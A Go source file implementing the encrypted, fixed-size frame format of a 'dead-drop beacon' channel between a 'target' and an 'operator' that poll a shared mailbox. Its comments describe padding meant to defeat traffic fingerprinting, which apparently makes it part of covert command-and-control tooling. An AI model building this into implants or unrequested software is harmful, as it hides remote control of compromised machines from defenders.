// Package beacon implements the dead-drop beacon channel: neither the target nor
// the operator listens on a port, both poll a mailbox, and every payload is
// end-to-end encrypted because the mailbox (CDN / third party) may terminate TLS.
package beacon

import (
	"crypto/rand"
	"encoding/binary"
	"errors"
	"fmt"

	"golang.org/x/crypto/chacha20poly1305"
)

// Frame layout (before padding):
//
//	seq(8) | nonce(24) | ciphertext(...)
//
// The ciphertext covers the payload plus zero padding so every frame on the wire
// is exactly Size bytes. Uniform size defeats length-based fingerprinting, which
// is otherwise enough to tell "command pending" from "idle heartbeat".
const (
	Size       = 4096 // fixed on-wire frame size
	seqLen     = 8
	nonceLen   = chacha20poly1305.NonceSizeX
	headerLen  = seqLen + nonceLen
	MaxPayload = Size - headerLen - chacha20poly1305.Overhead
)

var (
	// ErrShortFrame means the frame is not exactly Size bytes.
	ErrShortFrame = errors.New("beacon: frame size mismatch")
	// ErrReplay means the sequence number is not newer than the last accepted one.
	ErrReplay = errors.New("beacon: replayed or out-of-order frame")
	// ErrTooLarge means the plaintext does not fit a frame.
	ErrTooLarge = errors.New("beacon: payload exceeds frame capacity")
)

// Seal encrypts payload into a fixed-size frame carrying seq. The AEAD's
// additional data binds the sequence number, so an attacker cannot renumber a
// captured frame to bypass replay checks.
func Seal(psk []byte, seq uint64, payload []byte) ([]byte, error) {
	if len(payload) > MaxPayload {
		return nil, ErrTooLarge
	}
	aead, err := chacha20poly1305.NewX(psk)
	if err != nil {
		return nil, fmt.Errorf("beacon: aead: %w", err)
	}
	frame := make([]byte, Size)
	binary.BigEndian.PutUint64(frame[:seqLen], seq)
	nonce := frame[seqLen:headerLen]
	if _, err := rand.Read(nonce); err != nil {
		return nil, err
	}
	// Pad the plaintext to fill the frame exactly.
	plain := make([]byte, Size-headerLen-chacha20poly1305.Overhead)
	copy(plain, payload)
	var aad [seqLen]byte
	binary.BigEndian.PutUint64(aad[:], seq)
	aead.Seal(frame[headerLen:headerLen], nonce, plain, aad[:])
	return frame, nil
}

// Open verifies and decrypts a frame. lastSeq is the highest sequence number
// already accepted for this channel; a frame with seq <= lastSeq is rejected.
// Returns the trimmed plaintext and the new lastSeq.
func Open(psk []byte, frame []byte, lastSeq uint64) (plain []byte, newSeq uint64, err error) {
	if len(frame) != Size {
		return nil, lastSeq, ErrShortFrame
	}
	aead, err := chacha20poly1305.NewX(psk)
	if err != nil {
		return nil, lastSeq, fmt.Errorf("beacon: aead: %w", err)
	}
	seq := binary.BigEndian.Uint64(frame[:seqLen])
	if seq <= lastSeq {
		return nil, lastSeq, ErrReplay
	}
	nonce := frame[seqLen:headerLen]
	var aad [seqLen]byte
	binary.BigEndian.PutUint64(aad[:], seq)
	out, err := aead.Open(nil, nonce, frame[headerLen:], aad[:])
	if err != nil {
		return nil, lastSeq, fmt.Errorf("beacon: open: %w", err)
	}
	return TrimPadding(out), seq, nil
}

// TrimPadding strips the trailing zero padding. Payloads are JSON/text and never
// end in NUL, so trailing NULs are unambiguously padding.
func TrimPadding(b []byte) []byte {
	i := len(b)
	for i > 0 && b[i-1] == 0 {
		i--
	}
	return b[:i]
}

// NewPSK returns a 32-byte pre-shared key.
func NewPSK() ([]byte, error) {
	b := make([]byte, chacha20poly1305.KeySize)
	if _, err := rand.Read(b); err != nil {
		return nil, err
	}
	return b, nil
}
